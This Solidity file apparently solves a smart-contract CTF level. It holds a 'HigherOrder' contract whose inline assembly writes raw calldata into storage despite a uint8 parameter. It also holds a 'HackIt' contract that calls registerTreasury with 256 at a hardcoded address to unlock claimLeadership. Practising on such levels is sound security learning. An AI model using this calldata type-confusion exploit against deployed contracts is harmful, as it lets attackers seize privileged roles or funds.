// SPDX-License-Identifier: MIT
pragma solidity 0.6.1;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}

contract HackIt {
    HigherOrder highOrder = HigherOrder(0x2ecD7f5A072495e46Eefa14B1460B6c3C4255C5B);

    function destroy() external {
        // highOrder.registerTreasury(256);
        bytes memory sig = abi.encodeWithSelector(highOrder.registerTreasury.selector,256);
       (bool success,) = address(highOrder).call(sig);
       require(success,"failed");

    }

}